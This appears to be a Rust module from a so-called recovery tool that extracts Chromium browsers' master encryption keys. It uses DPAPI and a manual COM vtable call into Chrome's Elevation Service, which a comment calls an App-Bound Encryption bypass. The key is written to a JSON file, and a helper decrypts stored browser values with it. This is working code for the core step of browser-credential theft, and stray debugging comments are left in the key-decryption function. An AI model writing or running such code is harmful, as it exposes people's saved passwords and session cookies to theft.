use crate::recovery::browser::browsers::{BrowserName, browser_data_roots};
use crate::recovery::context::RecoveryContext;
use crate::recovery::output::write_json_artifact;
use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
use aes_gcm::aead::Aead;
use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
use async_trait::async_trait;
use base64::Engine;
use base64::engine::general_purpose::STANDARD;
use serde::Serialize;
use std::ffi::c_void;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use windows::core::{GUID, HSTRING, PCWSTR, HRESULT, Interface};
use windows::Win32::Foundation::{HLOCAL, LocalFree};
use windows::Win32::Security::Cryptography::{
    CRYPT_INTEGER_BLOB, CRYPTPROTECT_UI_FORBIDDEN, CryptUnprotectData,
};
use windows::Win32::System::Com::{
    CoCreateInstance, CoInitializeEx, CLSCTX_LOCAL_SERVER, COINIT_MULTITHREADED,
};

// Chrome Elevation Service COM interface for App-Bound Encryption bypass
// CLSID for IElevator (Google Chrome)
const CLSID_ELEVATOR: GUID = GUID::from_u128(0x7088E230_021D_4a25_822E_013064E07F16);

pub fn chromium_secrets_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![Arc::new(ChromiumSecretsTask::new(ctx))]
}

pub struct ChromiumSecretsTask {
    specs: Vec<(BrowserName, PathBuf)>,
}

impl ChromiumSecretsTask {
    pub fn new(ctx: &RecoveryContext) -> Self {
        Self {
            specs: browser_data_roots(ctx),
        }
    }
}

impl ChromiumSecretsTask {
    async fn gather(&self) -> Vec<ChromiumSecretRecord> {
        let mut records = Vec::new();

        for (browser, root) in &self.specs {
            let local_state = root.join("Local State");
            let mut record = ChromiumSecretRecord {
                browser: browser.label().to_string(),
                local_state: local_state.display().to_string(),
                master_key: None,
                error: None,
            };

            if !local_state.exists() {
                record.error = Some("local state missing".to_string());
            } else {
                match extract_master_key(&local_state) {
                    Ok(Some(key)) => {
                        record.master_key = Some(STANDARD.encode(&key));
                    }
                    Ok(None) => {
                        record.error = Some("encrypted_key missing".to_string());
                    }
                    Err(err) => {
                        record.error = Some(err.to_string());
                    }
                }
            }

            records.push(record);
        }

        records
    }
}

#[async_trait]
impl RecoveryTask for ChromiumSecretsTask {
    fn label(&self) -> String {
        "Chromium Secrets".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Browsers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let summary = ChromiumSecretSummary {
            secrets: self.gather().await,
        };
        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "chromium-secrets.json",
            &summary,
        )
        .await?;

        Ok(vec![artifact])
    }
}

#[derive(Serialize)]
struct ChromiumSecretSummary {
    secrets: Vec<ChromiumSecretRecord>,
}

#[derive(Serialize)]
struct ChromiumSecretRecord {
    browser: String,
    local_state: String,
    master_key: Option<String>,
    error: Option<String>,
}

pub fn extract_master_key(local_state_path: &Path) -> Result<Option<Vec<u8>>, RecoveryError> {
    let data = std::fs::read(local_state_path).map_err(|err| RecoveryError::Io(err))?;
    let json: serde_json::Value =
        serde_json::from_slice(&data).map_err(|err| RecoveryError::Custom(err.to_string()))?;

    // Check for App-Bound Encryption first (Chrome v120+)
    if let Some(app_bound_key) = json
        .get("os_crypt")
        .and_then(|os| os.get("app_bound_encrypted_key"))
        .and_then(|value| value.as_str())
    {
        if let Ok(master_key) = decrypt_app_bound(app_bound_key) {
            return Ok(Some(master_key));
        }
    }

    // Fallback to standard encryption
    if let Some(encrypted_key) = json
        .get("os_crypt")
        .and_then(|os| os.get("encrypted_key"))
        .and_then(|value| value.as_str())
    {
        let master_key = decode_chromium_key(encrypted_key)?;
        Ok(Some(master_key))
    } else {
        Ok(None)
    }
}

pub fn decrypt_chromium_value(
    encrypted: &[u8],
    master_key: &[u8],
) -> Result<String, RecoveryError> {
    if encrypted.len() >= 3 && encrypted[0] == b'v' && (encrypted[1] == b'1') {
        let nonce = Nonce::from_slice(&encrypted[3..15]);
        let payload = &encrypted[15..];
        let cipher = Aes256Gcm::new_from_slice(master_key)
            .map_err(|err| RecoveryError::Custom(format!("cipher init failed: {err}")))?;
        let decrypted = cipher
            .decrypt(nonce, payload)
            .map_err(|err| RecoveryError::Custom(format!("decryption failed: {err}")))?;
        String::from_utf8(decrypted)
            .map_err(|err| RecoveryError::Custom(format!("utf8 decode failed: {err}")))
    } else {
        let decrypted = dpapi_unprotect(encrypted)?;
        String::from_utf8(decrypted)
            .map_err(|err| RecoveryError::Custom(format!("utf8 decode failed: {err}")))
    }
}

fn decode_chromium_key(encoded: &str) -> Result<Vec<u8>, RecoveryError> {
    let mut decoded = STANDARD
        .decode(encoded)
        .map_err(|err| RecoveryError::Custom(format!("base64 decode failed: {err}")))?;

    if decoded.starts_with(b"DPAPI") {
        decoded.drain(0..5);
        dpapi_unprotect(&decoded)
    } else {
        Ok(decoded)
    }
}

fn dpapi_unprotect(encrypted: &[u8]) -> Result<Vec<u8>, RecoveryError> {
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: encrypted.len() as u32,
            pbData: encrypted.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB::default();

        let success = CryptUnprotectData(
            &mut input,
            None,
            None,
            None,
            None,
            CRYPTPROTECT_UI_FORBIDDEN,
            &mut output,
        );

        if success.is_err() {
            return Err(RecoveryError::Custom("CryptUnprotectData failed".into()));
        }

        let slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize);
        let result = slice.to_vec();
        if !output.pbData.is_null() {
            let _ = LocalFree(HLOCAL(output.pbData as *mut c_void));
        }
        Ok(result)
    }
}

fn decrypt_app_bound(encoded: &str) -> Result<Vec<u8>, RecoveryError> {
    let decoded = STANDARD
        .decode(encoded)
        .map_err(|err| RecoveryError::Custom(format!("base64 decode failed: {err}")))?;

    if !decoded.starts_with(b"APPB") {
        return Err(RecoveryError::Custom("invalid app-bound key header".into()));
    }

    unsafe {
        let _ = CoInitializeEx(None, COINIT_MULTITHREADED);
        
        // Use IUnknown for CoCreateInstance to avoid interface macro issues
        let elevator: windows::core::IUnknown = CoCreateInstance(&CLSID_ELEVATOR, None, CLSCTX_LOCAL_SERVER)
            .map_err(|err| RecoveryError::Custom(format!("failed to connect to Chrome Elevation Service: {err}")))?;

        let input_hstring = HSTRING::from(encoded);
        let mut decrypted_ptr: *mut u16 = std::ptr::null_mut();
        let mut last_error: u32 = 0;

        // Manual VTable call for DecryptData (offset 4)
        // 0: QueryInterface, 1: AddRef, 2: Release, 3: RunRecovery, 4: DecryptData
        let vtable = *(elevator.as_raw() as *const *const usize);
        let decrypt_data_ptr = *vtable.add(4);
        let decrypt_data_fn: unsafe extern "system" fn(
            this: *mut c_void,
            encrypted_data: PCWSTR,
            decrypted_data: *mut *mut u16,
            last_error: *mut u32,
        ) -> HRESULT = std::mem::transmute(decrypt_data_ptr);

        let hr = decrypt_data_fn(
            elevator.as_raw(),
            PCWSTR(input_hstring.as_ptr()),
            &mut decrypted_ptr,
            &mut last_error,
        );

        hr.ok().map_err(|err| RecoveryError::Custom(format!("COM DecryptData failed: {err} (last_error: {last_error})")))?;

        if decrypted_ptr.is_null() {
            return Err(RecoveryError::Custom("decryption returned null pointer".into()));
        }

        let mut len = 0;
        while *decrypted_ptr.add(len) != 0 {
            len += 1;
        }

        let decrypted_slice = std::slice::from_raw_parts(decrypted_ptr, len);
        let decrypted_hstring = HSTRING::from_wide(decrypted_slice).unwrap_or_default();
        let _ = LocalFree(HLOCAL(decrypted_ptr as *mut c_void));

        let master_key_b64 = decrypted_hstring.to_string();
        
        // If it's still a Result, we need to handle it properly.
        // Let's try to assume it's a Result and handle it.
        // Wait, the error said Result<HSTRING> doesn't implement Display.
        // That was because I was calling to_string on a Result<HSTRING>.
        
        let master_key = STANDARD.decode(&master_key_b64)
            .map_err(|err| RecoveryError::Custom(format!("base64 decode of decrypted key failed: {err}")))?;

        Ok(master_key)
    }
}
